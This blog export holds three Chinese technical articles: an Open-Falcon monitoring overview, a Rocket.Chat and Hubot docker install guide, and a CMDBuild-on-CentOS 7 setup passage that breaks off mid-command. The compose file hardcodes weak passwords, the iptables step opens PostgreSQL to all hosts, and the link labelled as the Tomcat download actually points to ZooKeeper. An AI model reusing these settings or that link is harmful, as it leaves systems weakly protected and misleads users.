    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>本篇文章介绍下openfalcon的基本原理和使用，粒度相对较粗，主要目的是使大家迅速掌握open-falcon的数据模型、功能模块、运作流程和使用方法。</p>
<a id="more"></a>

<h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a><strong>基本介绍</strong></h2><p>Open-Falcon 是小米研发的一款开源的互联网企业级监控系统解决方案，目前小米、金山云、美团、京东金融、滴滴等公司有在使用。</p>
<p>下面我们遵循着问题来展开整篇文章。<strong>首先，open-falcon能做什么？</strong></p>
<p>主要特点有</p>
<p>  ①数据采集免配置：agent自发现、支持Plugin、主动推送模式</p>
<p>  ②容量水平扩展：生产环境每秒50万次数据收集、告警、存储、绘图，可持续水平扩展。</p>
<p>  ③告警策略自发现：Web界面、支持策略模板、模板继承和覆盖、多种告警方式、支持回调动作。</p>
<p>  ④告警设置人性化：支持最大告警次数、告警级别设置、告警恢复通知、告警暂停、不同时段不同阈</p>
<p>​      值、支持维护周期，支持告警合并。</p>
<p>  ⑤历史数据高效查询：秒级返回上百个指标一年的历史数据。</p>
<p>  ⑥Dashboard人性化：多维度的数据展示，用户自定义Dashboard等功能。</p>
<p>  ⑦架构设计高可用：整个系统无核心单点，易运维，易部署。</p>
<p><strong>其次，openfalcon能对哪些项目做监控 ？</strong></p>
<p> 1）基础监控。</p>
<p>   比如CPU、Load、内存、磁盘、IO、网络相关、内核参数、ss 统计输出、端口存活状态、进程存活状态、核心服务的进程存活信息采集、关键业务进程资源消耗、NTP offset采集、DNS解析采集，这些指标，都是open-falcon的agent组件直接支持的。</p>
<p>  2）业务应用监控。</p>
<p>   比如我的应用服务部署上线后，需要统计某个接口的平均耗时、调用次数、成功率等信息，这些属于业务应用的监控。这里需要研发人员编写脚本等方式来收集数据，然后发送到open-falcon的transfer组件。</p>
<p>  3）第三方开源软件监控。</p>
<p>  比如mysql、lvs、nginx、redis、mq等，需单独编写采集脚本或插件，这些常见的软件，一般开源社区都有提供相应的脚本。</p>
<p>  这里有个openfalcon与其他一些监控软件的对比，</p>
<p><img src="/articles/cd887590/1.png" alt></p>
<p><strong>个人觉得，falcon比较大的优势在于扩展性和灵活性方面。</strong></p>
<h2 id="技术架构"><a href="#技术架构" class="headerlink" title="技术架构"></a><strong>技术架构</strong></h2><p>涉及架构或结构时，图是比较好的展示方式，下图摘自官网，可以看出组件及组件间协作。</p>
<p><img src="/articles/cd887590/2.png" alt></p>
<p>绿色的粗线表示数据传输流程，橙黄色虚线表示控制流（策略，告警），浅蓝色虚线标识查询流程；</p>
<p>下图是一个相对规整的数据流图，更有助于理解：</p>
<p><img src="/articles/cd887590/3.png" alt></p>
<p>具体而言，整体的运作流程如下：</p>
<p>1、目标服务器运行agent </p>
<p>2、agent采集各类监控项数值，传给transfer</p>
<p>3、transfer校验和整理监控项数值，做一致性hash分片，传给对应的judge模块以验证是否触发告警 </p>
<p>4、transfer整理监控项数值，做一致性hash分片，传输给graph以进行数据的存储 </p>
<p>5、judge根据具体报警策略或阈值进行告警判断，如触发告警则组装告警event事件，写入缓存队列。 </p>
<p>6、alarm和sender根据event事件中的判定结果，执行event，像用户组发送短信或邮件。 </p>
<p>7、graph收到监控项数据后，将数据存储成RRD文件格式，进行归档，并提供查询接口。 </p>
<p>8、query将调用graph的查询接口，将监控数据传送到dashboard以进行页面展示。 </p>
<p>9、dashboard则渲染页面，展示曲线报表图等。 </p>
<p>10、portal提供页面供用户配置机器分组、报警策略、表达式、nodata等配置。</p>
<h2 id="数据模型"><a href="#数据模型" class="headerlink" title="数据模型"></a><strong>数据模型</strong></h2><p>灵活强大的数据模型能提高监控系统的使用效率和灵活性（这小节提到的数据模型应该叫监控项数据模型），<strong>open-falcon的数据模型长什么样？设计初衷又是什么？</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">open-falcon的"监控项"模型如下，</span><br><span class="line">&#123;</span><br><span class="line">       metric: cpu.busy,               // 监控项名称</span><br><span class="line"></span><br><span class="line">       endpoint: open-falcon-host,     // 目标服务器的主机名</span><br><span class="line"></span><br><span class="line">       tags: srv=falcon,group=az1,     // tag标签，作用是聚合和归类，在配报警策略时会比较方便。</span><br><span class="line"></span><br><span class="line">       value: 10,                      // 监控项数值</span><br><span class="line"></span><br><span class="line">       timestamp: `date +%s`,          // 采集时间</span><br><span class="line"></span><br><span class="line">       counterType: GAUGE,             //  监控项类型。 </span><br><span class="line"></span><br><span class="line">       step: 60                        // 采集间隔。 秒。</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种模型的主要好处：一是方便从多个维度来配置告警，二是可以灵活的进行自主数据采集。</p>
<pre><code>第一点，比如tag的使用起到了给机器进行归类的作用，比如有3台机器：host1、host2和host3，如果tags依次配置为&quot;group=java&quot;, &quot;group=java&quot;和&quot;group=erlang&quot;，那么配置报警策略&quot;metric=cpu/group=java“时就只会对java标签的机器（即host1，host2)生效。

第二点，由于agent会自发现的采集很多基本的系统指标，但是对业务应用等需要研发人员自己写脚本收集和上报。这里openfalcon定义了监控项模型，相当于定义了一个规范，当研发人员需要监控某个对象（比如mysql、redis等），只需采集数据，并遵守规范包装成监控项模型，再上报即可。</code></pre><p><strong>open-falcon使用的监控项有哪些类型 ？</strong></p>
<p>主要有三种：</p>
<p>(1) GAUGE：实测值，直接使用采集的原始数值，比如气温；</p>
<p>(2) COUNTER：记录连续增长的数据，只增不减。比如汽车行驶里程，网卡流出流量，cpu_idle等；</p>
<p>(3) DERIVE：变化率，类似COUNTER ，但是可增可减。</p>
<h2 id="主要模块"><a href="#主要模块" class="headerlink" title="主要模块"></a><strong>主要模块</strong></h2><h4 id="agent"><a href="#agent" class="headerlink" title="agent"></a><strong>agent</strong></h4><ul>
<li><strong>首先，什么是Agent？</strong></li>
</ul>
<p>agent是go开发的daemon程序，用于自发现的采集机器的各种数据和指标。部署在目标机器上，无需在server端进行任何配置，安装后启动即工作，是open-falcon的”数据采集者”。</p>
<ul>
<li><strong>主要功能？</strong></li>
</ul>
<p>​       1）自发现的采集各类数据和指标，上报transfer；</p>
<p>​       2）与hbs进行心跳连接通信，上报主机状态，同步插件和监控进程、监控端口；</p>
<ul>
<li><strong>可采集的数据有哪些？</strong></li>
</ul>
<p>​        基础监控项(硬件,负载)、业务应用监控数据、各种开源软件监控数据等。</p>
<ul>
<li><p><strong>falcon是如何采集的？</strong></p>
<p>   1）基础监控</p>
<p>​    一般是读系统文件或执行基本命令，然后对原始值进行处理。比如cpu和内存信息是通过读取/proc/stat和/proc/meminfo获得；端口监控，是通过ss –ln 来判断指定端口是否处于listen状态；</p>
<p>   2）业务应用监控</p>
<p>   一般由”插件”或”采集脚本”实现，需自己编写。比如接口的调用次数、耗时、失败次数、成功次数都属于这类。(日志、基础统计工具)</p>
<p>   3）开源软件监控</p>
<p>   一般开源社区都有提供采集脚本</p>
</li>
<li><p><strong>如何扩展agent – 插件？</strong></p>
<p>除了基础监控项，有时用户想扩展agent的功能以采集更多指标，openfalcon提供了插件机制。插件的使用可以参考官方git文档，下面摘抄了作者们的一段话，其实就是一些采集脚本及同步执行的方式。</p>
<p>  “插件设计思路：</p>
<p>  a) 写一个采集数据的脚本</p>
<p>  b) 把脚本分发到需要采集数据的机器上</p>
<p>  c) 写一个cron每隔一段时间去跑这个脚本</p>
<p>  d) 收集脚本的输出，调用server的接口去push数据</p>
<p>  e) 根据需求相应的对脚本做上线、下线、升级”</p>
</li>
<li><p><strong>agent的工作流程：</strong></p>
<p><img src="/articles/cd887590/4.png" alt></p>
</li>
</ul>
<h4 id="Transfer组件"><a href="#Transfer组件" class="headerlink" title="Transfer组件"></a><strong>Transfer组件</strong></h4><ul>
<li><p><strong>什么是transfer？</strong></p>
<p>open-falcon的后端门户，监控数据的中转接点。</p>
</li>
<li><p><strong>transfer的职责角色？</strong></p>
<p>提供数据接收接口和自定义脚本push数据；</p>
</li>
</ul>
<p>​        根据一致性hash算法将内存队列中的数据发送给graph和judge模块；(重点)</p>
<p>​        为每个后端实例创建一个 定长Queue；</p>
<p>​        为每个后端实例维护一个rpc连接池；</p>
<p><img src="/articles/cd887590/5.png" alt></p>
<p>这里每个后端的graph或judge实例都建立了一个rpc连接池和一个定长Queue队列。</p>
<p>有两个小点这里提下：</p>
<p>1，定长Queue队列目的是应对高峰流量，丢失一部分高峰时段的数据保证了后端的graph和judge组件不受影响；</p>
<ol start="2">
<li>v1.0版本的openfalcon中，每个graph实例可以有多个ip而且transfer会给每个ip发送相同的一份数据，但是judge中每个实例只能有1个ip。</li>
</ol>
<ul>
<li><p><strong>transfer的工作流程？</strong></p>
<p><img src="/articles/cd887590/6.png" alt></p>
</li>
</ul>
<h4 id="graph组件"><a href="#graph组件" class="headerlink" title="graph组件"></a><strong>graph组件</strong></h4><ul>
<li><strong>什么是graph？graph的职责？</strong></li>
</ul>
<p>​      存储监控数据、提供监控数据的高效查询接口。</p>
<ul>
<li><p><strong>graph的架构图(摘自项目git)：</strong></p>
<p><img src="/articles/cd887590/7.png" alt></p>
</li>
</ul>
<h4 id="judge-amp-alarm-amp-sender组件"><a href="#judge-amp-alarm-amp-sender组件" class="headerlink" title="judge&amp;alarm&amp;sender组件"></a><strong>judge&amp;alarm&amp;sender组件</strong></h4><p>这三个组件是报警的链路，负责判断是否触发报警，理论上可以进化成一个模块。感兴趣的可以看代码，很多匹配逻辑。</p>
<p>judge: 记载策略到缓存，判断监控项是否触发告警策略，发告警事件；</p>
<p>alarm&amp;sender: 读取告警事件；发邮件、短信等；</p>
<h4 id="hbs组件"><a href="#hbs组件" class="headerlink" title="hbs组件"></a><strong>hbs组件</strong></h4><ul>
<li><strong>什么是hbs，hbs的职责？</strong></li>
</ul>
<p>​      heart beat server，心跳服务器，更多承担”配置中心”的角色。</p>
<p>​      1）Agent可以从hbs同步”报警策略”、”进程存活监控”、”端口存活监控”等信息。</p>
<p>​      2）agent定期发送心跳信息，hbs负责维护host表；</p>
<ul>
<li><p><strong>hbs的工作流程：</strong></p>
<p><img src="/articles/cd887590/8.png" alt></p>
</li>
</ul>
<h2 id="如何使用？"><a href="#如何使用？" class="headerlink" title="如何使用？"></a><strong>如何使用？</strong></h2><h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><p>  (1)、如何监控基本监控项？</p>
<p>  (2)、如何使用插件，监控“第三方应用”？如何监控“端口/进程”？</p>
<p>  (3)、如何配置“告警规则”?</p>
<p>  (4)、如何使用hostGroup、template、expression、nodata、uic？</p>
<p>  (5)、如何更好管理机器？如hostName、hostGroup的命名约定；</p>
<h4 id="先要理解的一些概念"><a href="#先要理解的一些概念" class="headerlink" title="先要理解的一些概念"></a><strong>先要理解的一些概念</strong></h4><p>  (1)、机器分组</p>
<p>  (2)、用户组</p>
<p>  (3)、模板</p>
<p>  (4)、表达式</p>
<p>  (5)、报警策略</p>
<p>  (6)、回调动作</p>
<h4 id="如何采集基本监控项-？"><a href="#如何采集基本监控项-？" class="headerlink" title="如何采集基本监控项 ？"></a><strong>如何采集基本监控项 ？</strong></h4><p> 在目标机器上部署agent，正确配置，启动即可；</p>
<h4 id="如何监控“第三方应用”，如mysql-lvs-nginx？"><a href="#如何监控“第三方应用”，如mysql-lvs-nginx？" class="headerlink" title="如何监控“第三方应用”，如mysql/lvs/nginx？"></a><strong>如何监控“第三方应用”，如mysql/lvs/nginx？</strong></h4><p>自己写脚本，上报到open-falcon；或者使用开源的插件或脚本；</p>
<p> <a href="https://book.open-falcon.org/zh/philosophy/data-collect.html" target="_blank" rel="noopener">https://book.open-falcon.org/zh/philosophy/data-collect.html</a></p>
<h4 id="如何监控“端口存活”、“进程存活”-？"><a href="#如何监控“端口存活”、“进程存活”-？" class="headerlink" title="如何监控“端口存活”、“进程存活” ？"></a><strong>如何监控“端口存活”、“进程存活” ？</strong></h4><p>在port页面，新增expression或template，给指定进程或端口配置报警策略；</p>
<h4 id="使用机器分组和报警策略模板？"><a href="#使用机器分组和报警策略模板？" class="headerlink" title="使用机器分组和报警策略模板？"></a><strong>使用机器分组和报警策略模板？</strong></h4><p>这里刚开始接触时觉得特别麻烦，后来拉出代码，分析其关联关系，梳理出了模型及关系图，一切变得清晰。下图依次是：hostgroup机器组管理、Tempalte报警策略模板、模型关系UML图。重点理解UML图，然后去页面上操作和比较下。</p>
<p><img src="/articles/cd887590/9.png" alt></p>
<p><img src="/articles/cd887590/10.png" alt></p>
<p><img src="/articles/cd887590/11.png" alt></p>
<h4 id="如何使用表达式-？“策略表达式”与”策略模板”的区别？"><a href="#如何使用表达式-？“策略表达式”与”策略模板”的区别？" class="headerlink" title="如何使用表达式 ？“策略表达式”与”策略模板”的区别？"></a><strong>如何使用表达式 ？“策略表达式”与”策略模板”的区别？</strong></h4><p>表达式比较简洁，在结合tag时可以使用策略表达式。</p>
<p>当无法区分类别时，比如所有监控项都没有加tag，只有进行人工分类，即使用”机器分组”，然后将”策略模板”绑定到”机器分组”。</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a><strong>其他</strong></h2><p>其他需要自己翻文档或代码了，比如nodata，aggravation等等。通过这篇文章，希望能掌握open-falcon的运作机制，数据模型，如何使用它。</p>
]]></content>
      <categories>
        <category>监控技术</category>
        <category>Open-falcon</category>
      </categories>
      <tags>
        <tag>Open-falcon</tag>
      </tags>
  </entry>
  <entry>
    <title>Rocketchat安装手册</title>
    <url>/articles/1f64fa0e.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>本文详细介绍了Chatops的实现服务Rocketchat的安装。</p>
<a id="more"></a>

<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a><strong>方法一：</strong></h4><p><strong>1，启动mongodb实例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --name db -d mongo:3.0 --smallfiles</span><br></pre></td></tr></table></figure>

<p><strong>2，启动rocketchat server:</strong></p>
<p>注意替换your_public_ip</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --name rocketchat -p 80:3000 --env ROOT_URL=http://&#123;your_public_ip&#125; --link db -d rocket.chat:0.62</span><br></pre></td></tr></table></figure>

<p>启动成功后，访问: http://{your_public_ip} 即可。</p>
<p><strong>3，hubot实例:（最新版本，脚本目录映射有问题，请自行去掉）</strong></p>
<p>添加robot前，确保server中已添加改账号，并设置了邮件为已验证。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it -d --name rocketchat-hubot -e ROCKETCHAT_URL=http://&#123;rocket_chat_server_ip&#125;:&#123;port&#125;  -e ROCKETCHAT_ROOM=<span class="string">'general'</span>  -e LISTEN_ON_ALL_PUBLIC=<span class="literal">true</span>   -e ROCKETCHAT_USER=bot   -e ROCKETCHAT_PASSWORD=password     -e ROCKETCHAT_AUTH=password    -e BOT_NAME=bot     -e EXTERNAL_SCRIPTS=hubot-pugme,hubot-help    -v <span class="variable">$PWD</span>/scripts:/home/hubot/scripts   rocketchat/hubot-rocketchat</span><br></pre></td></tr></table></figure>

<p>说明（下面未提及，不用更改）:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rocket_chat_server_ip: server地址</span><br><span class="line">ROCKETCHAT_ROOM: 默认加入的channel（房间），可以不填</span><br><span class="line">ROCKETCHAT_USER: robot名字, 例如: cicd-robot, git-merge-robot</span><br><span class="line">ROCKETCHAT_PASSWORD: 密码</span><br><span class="line">$PWD/scripts:/home/hubot/scripts: 本地scripts脚本映射到容器</span><br><span class="line">内</span><br></pre></td></tr></table></figure>

<h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>1，编辑yaml文件</p>
<p>docker-compose.yml</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">db:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  image:</span> <span class="attr">mongo:3.0</span></span><br><span class="line"><span class="attr">  command:</span> <span class="string">mongod</span> <span class="bullet">--smallfiles</span></span><br><span class="line"></span><br><span class="line"><span class="attr">rocketchat:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  image:</span> <span class="string">rocket.chat:0.62</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  environment:</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">    -</span> <span class="string">MONGO_URL=mongodb://db:27017/rocketchat</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">    -</span> <span class="string">ROOT_URL=http://10.10.0.137:3000</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">    -</span> <span class="string">Accounts_UseDNSDomainCheck=False</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  links:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">    - db:</span><span class="string">db</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  ports:</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">    -</span> <span class="number">3000</span><span class="string">:3000</span></span><br><span class="line"></span><br><span class="line"><span class="attr">hubot:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  image:</span> <span class="string">rocketchat/hubot-rocketchat</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  environment:</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">    -</span> <span class="string">ROCKETCHAT_URL=http://10.10.0.137:3000</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">    -</span> <span class="string">ROCKETCHAT_ROOM=GENERAL</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">    -</span> <span class="string">ROCKETCHAT_USER=Hubot</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">    -</span> <span class="string">ROCKETCHAT_PASSWORD=Sun123456</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">    -</span> <span class="string">BOT_NAME=Hubot</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">    -</span> <span class="string">EXTERNAL_SCRIPTS=hubot-help,hubot-seen,hubot-links,hubot-greetings</span></span><br><span class="line">    </span><br><span class="line"><span class="bullet">    -</span> <span class="string">HUBOT_JENKINS_URL=10.10.0.137:8080</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">    -</span> <span class="string">HUBOT_JENKINS_AUTH=admin:admin123</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  links:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">    - rocketchat:</span><span class="string">rocketchat</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">2, 安装docker-compose</span><br><span class="line">pip install docker-compose</span><br><span class="line">3, 启动容器</span><br><span class="line">docker-compose up</span><br></pre></td></tr></table></figure>

<p>4,  注册管理员账号</p>
<p><img src="/articles/1f64fa0e/1.png" alt="img"></p>
<p>5，添加bot账号（账号要和docker-compose中定义的用户名和密码一致）</p>
<p><img src="/articles/1f64fa0e/2.png" alt="img"></p>
<p><img src="/articles/1f64fa0e/3.png" alt="img"></p>
<p><img src="/articles/1f64fa0e/4.png" alt="img"></p>
<p><img src="/articles/1f64fa0e/5.png" alt="img"></p>
<p>6，重启所有容器，docker-compose restart</p>
<p>7,  验证</p>
<p><img src="/articles/1f64fa0e/6.png" alt="img"></p>
<p>8，测试脚本sun.coffee</p>
<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="params">(robot)</span> -&gt;</span></span><br><span class="line">  <span class="comment"># 匹配所有 hi 相关的输入，然后发送 hello 到聊天室</span></span><br><span class="line">  robot.hear <span class="regexp">/hi/i</span>, <span class="function"><span class="params">(res)</span> -&gt;</span></span><br><span class="line">    res.send <span class="string">'hello'</span></span><br></pre></td></tr></table></figure>

<p>9, 复制脚本到容器中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker cp ./sun.coffee root_hubot_1:/home/hubot/scripts</span><br></pre></td></tr></table></figure>

<p>10，重启容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker restart root_hubot_1</span><br><span class="line">docker <span class="built_in">exec</span> -u root -it root_hubot_1 /bin/bash</span><br></pre></td></tr></table></figure>

<p>11，验证</p>
<p><img src="/articles/1f64fa0e/7.png" alt="img"></p>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>RocketChat</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS7下CMDBuild源码安装</title>
    <url>/articles/a46a113c.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>本文对CMDBuild的安装配置进行了详细说明。 </p>
<a id="more"></a>

<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h4 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h4><p>系统：<a href="http://www.linuxidc.com/topicnews.aspx?tid=14" target="_blank" rel="noopener">CentOS</a>-7-x86_64-Everything-1511</p>
<h4 id="版本控制"><a href="#版本控制" class="headerlink" title="版本控制"></a>版本控制</h4><p>jdk版本(cmdb推荐版本1.8，采用1.8.0_131)：<a href="http://www.oracle.com/technetwork/java/javase/downloads/index.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/downloads/index.html</a> </p>
<p>tomcat版本(cmdb推荐版本7.068，采用7.0.79)：<a href="http://mirror.bit.edu.cn/apache/zookeeper/zookeeper-3.4.10/zookeeper-3.4.10.tar.gz" target="_blank" rel="noopener">http://mirror.bit.edu.cn/apache/zookeeper/zookeeper-3.4.10/zookeeper-3.4.10.tar.gz</a> </p>
<p> postgresql版本(cmdb推荐版本9.3，采用9.6.3)：<a href="https://download.postgresql.org/pub/repos/yum/9.6/redhat/rhel-7-x86_64/pgdg-centos96-9.6-3.noarch.rpm" target="_blank" rel="noopener">https://download.postgresql.org/pub/repos/yum/9.6/redhat/rhel-7-x86_64/pgdg-centos96-9.6-3.noarch.rpm</a> </p>
<h2 id="Tomcat安装配置"><a href="#Tomcat安装配置" class="headerlink" title="Tomcat安装配置"></a>Tomcat安装配置</h2><h3 id="安装jdk"><a href="#安装jdk" class="headerlink" title="安装jdk"></a>安装jdk</h3><h4 id="1）下载jdk"><a href="#1）下载jdk" class="headerlink" title="1）下载jdk"></a>1）下载jdk</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/src/</span><br><span class="line">wget http://download.Oracle.com/otn-pub/java/jdk/8u131-b11/d54c1d3a095b4ff2b6607d096fa80163/jdk-8u131-linux-x64.rpm?AuthParam=1499065226_0efcc513ff7eb3edb189b0ee0eb7f2d1</span><br></pre></td></tr></table></figure>

<h4 id="2）安装jdk"><a href="#2）安装jdk" class="headerlink" title="2）安装jdk"></a>2）安装jdk</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">安装完成后可使用<span class="string">"java --version"</span>查看环境是否准备就绪</span></span><br><span class="line">rpm -ivh jdk-8u131-linux-x64.rpm</span><br></pre></td></tr></table></figure>

<h3 id="安装tomcat"><a href="#安装tomcat" class="headerlink" title="安装tomcat"></a>安装tomcat</h3><h4 id="1）下载tomcat"><a href="#1）下载tomcat" class="headerlink" title="1）下载tomcat"></a>1）下载tomcat</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#注意是下载二进制包，非src包" apache-tomcat-7.0.79-src.tar.gz"</span></span><br><span class="line">wget http://mirrors.hust.edu.cn/apache/tomcat/tomcat-7/v7.0.79/bin/apache-tomcat-7.0.79.tar.gz</span><br></pre></td></tr></table></figure>

<h4 id="2）解压-amp-设置tomcat"><a href="#2）解压-amp-设置tomcat" class="headerlink" title="2）解压&amp;设置tomcat"></a>2）解压&amp;设置tomcat</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -zxvf apache-tomcat-7.0.79.tar.gz -C /usr/<span class="built_in">local</span>/</span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/</span><br><span class="line">mv apache-tomcat-7.0.79/ tomcat7/</span><br></pre></td></tr></table></figure>

<h4 id="3）设置环境变量"><a href="#3）设置环境变量" class="headerlink" title="3）设置环境变量"></a>3）设置环境变量</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#"tomcat7.sh"中的"tomcat7"部分自定义</span></span><br><span class="line">vim /etc/profile.d/tomcat7.sh</span><br><span class="line"></span><br><span class="line">CATALINA_HOME=/usr/<span class="built_in">local</span>/tomcat7</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$CATALINA_HOME</span>/bin</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure>

<h4 id="4）设置iptables"><a href="#4）设置iptables" class="headerlink" title="4）设置iptables"></a>4）设置iptables</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#tcp5432是postgresql的监听端口，tcp8080是tomcat的监听端口</span></span><br><span class="line">vim /etc/sysconfig/iptables</span><br><span class="line"></span><br><span class="line">-A INPUT -p tcp -m state --state NEW -m tcp --dport 5432 -j ACCEPT</span><br><span class="line">-A INPUT -p tcp -m state --state NEW -m tcp --dport 8080 -j ACCEPT</span><br><span class="line"></span><br><span class="line">service iptables restart</span><br></pre></td></tr></table></figure>

<h4 id="5）设置开机启动（CentOS7-x）"><a href="#5）设置开机启动（CentOS7-x）" class="headerlink" title="5）设置开机启动（CentOS7.x）"></a>5）设置开机启动（CentOS7.x）</h4><p><strong>增加tomcat启动参数</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#文件名“setenv.sh”固定，catalina.sh启动的时候会调用；</span></span><br><span class="line"><span class="comment">#“tomcat.pid”文件会在tomcat启动后生成在$TOMCAT_HOME目录下</span></span><br><span class="line">vim /usr/<span class="built_in">local</span>/tomcat7/bin/setenv.sh</span><br><span class="line"><span class="comment">#add tomcat pid  </span></span><br><span class="line">CATALINA_PID=<span class="string">"<span class="variable">$CATALINA_BASE</span>/tomcat.pid"</span></span><br></pre></td></tr></table></figure>

<p><strong>增加tomcat.service</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#“tomcat.service”中的“tomcat”部分自定义；</span></span><br><span class="line"><span class="comment">#或者在/etc/rc.d/rc.local添加启动脚本。</span></span><br><span class="line">vim /usr/lib/systemd/system/tomcat.service</span><br><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description=Tomcat  </span><br><span class="line">After=syslog.target network.target remote-fs.target nss-lookup.target  </span><br><span class="line">   </span><br><span class="line">[Service]  </span><br><span class="line">Type=forking  </span><br><span class="line">PIDFile=/usr/<span class="built_in">local</span>/tomcat7/tomcat.pid</span><br><span class="line">ExecStart=/usr/<span class="built_in">local</span>/tomcat7/bin/startup.sh</span><br><span class="line">ExecReload=/bin/<span class="built_in">kill</span> -s HUP <span class="variable">$MAINPID</span>  </span><br><span class="line">ExecStop=/bin/<span class="built_in">kill</span> -s QUIT <span class="variable">$MAINPID</span>  </span><br><span class="line">PrivateTmp=<span class="literal">true</span>  </span><br><span class="line">   </span><br><span class="line">[Install]  </span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br><span class="line">systemctl <span class="built_in">enable</span> tomcat.service</span><br></pre></td></tr></table></figure>

<h4 id="6）启动-amp-验证tomcat"><a href="#6）启动-amp-验证tomcat" class="headerlink" title="6）启动&amp;验证tomcat"></a>6）启动&amp;验证tomcat</h4><h5 id="启动tomcat"><a href="#启动tomcat" class="headerlink" title="启动tomcat"></a><strong>启动tomcat</strong></h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#或者使用systemctl命令</span></span><br><span class="line">catalina.sh start</span><br></pre></td></tr></table></figure>

<h5 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -tunlp</span><br></pre></td></tr></table></figure>

<h5 id="web访问"><a href="#web访问" class="headerlink" title="web访问"></a>web访问</h5><p>浏览器：<a href="http://ip:8080" target="_blank" rel="noopener">http://ip:8080</a></p>
<h2 id="部署cmdbuild"><a href="#部署cmdbuild" class="headerlink" title="部署cmdbuild"></a>部署cmdbuild</h2><h3 id="下载cmdbbuild"><a href="#下载cmdbbuild" class="headerlink" title="下载cmdbbuild"></a>下载cmdbbuild</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/src</span><br><span class="line">wget https://ncu.dl.sourceforge.net/project/cmdbuild/2.4.3/cmdbuild-2.4.3.zip</span><br></pre></td></tr></table></figure>

<h3 id="部署cmdbuild-1"><a href="#部署cmdbuild-1" class="headerlink" title="部署cmdbuild"></a>部署cmdbuild</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unzip cmdbuild-2.4.3.zip</span><br><span class="line"><span class="built_in">cd</span> cmdbuild-2.4.3</span><br><span class="line"></span><br><span class="line"><span class="comment">#复制解压目录下的“cmdbuild-2.4.3.war”到$TOMCAT_HOME的webapps目录下，并更名为” cmdbuild.war”;</span></span><br><span class="line"><span class="comment">#复制解压目录下的“extras/tomcat-libs/6.0\ or\ higher/postgresql-9.4.1207.jar”到$TOMCAT_HOME的lib目录下，版本与postgresql不一致可忽略;</span></span><br><span class="line"><span class="comment">#配置后需要重启tomcat，war包在tomcat启动会被解析</span></span><br><span class="line">cp cmdbuild-2.4.3.war /usr/<span class="built_in">local</span>/tomcat7/webapps/cmdbuild.war</span><br><span class="line">cp 